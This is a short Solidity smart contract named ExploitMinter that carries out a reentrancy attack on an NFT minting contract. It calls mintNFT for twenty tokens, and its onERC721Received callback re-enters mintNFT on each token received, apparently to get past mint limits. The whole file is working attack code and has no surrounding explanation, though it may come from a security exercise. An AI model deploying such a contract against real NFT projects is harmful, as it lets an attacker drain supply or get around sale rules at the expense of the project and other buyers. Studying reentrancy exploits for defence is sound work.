/**
 * SPDX-License-Identifier: LGPL-3.0-or-later
 */

pragma solidity ^0.8.0;

import "../interfaces/IERC721TokenReceiver.sol";

interface IExploitERC721Mint {
    function mintNFT(uint256 numberOfNfts) external payable;
}

contract ExploitMinter is IERC721TokenReceiver {
    uint256 value = 0.001 ether;

    IExploitERC721Mint private nft;

    constructor(address nftaddr) {
        nft = IExploitERC721Mint(nftaddr);
    }

    receive() external payable {}

    function toMinter() external {
        nft.mintNFT{value: value * 20}(20);
    }

    function onERC721Received(
        address _operator,
        address _from,
        uint256 _tokenId,
        bytes memory _data
    ) external returns (bytes4) {
        nft.mintNFT{value: value}(1);
        return 0x150b7a02;
    }
}
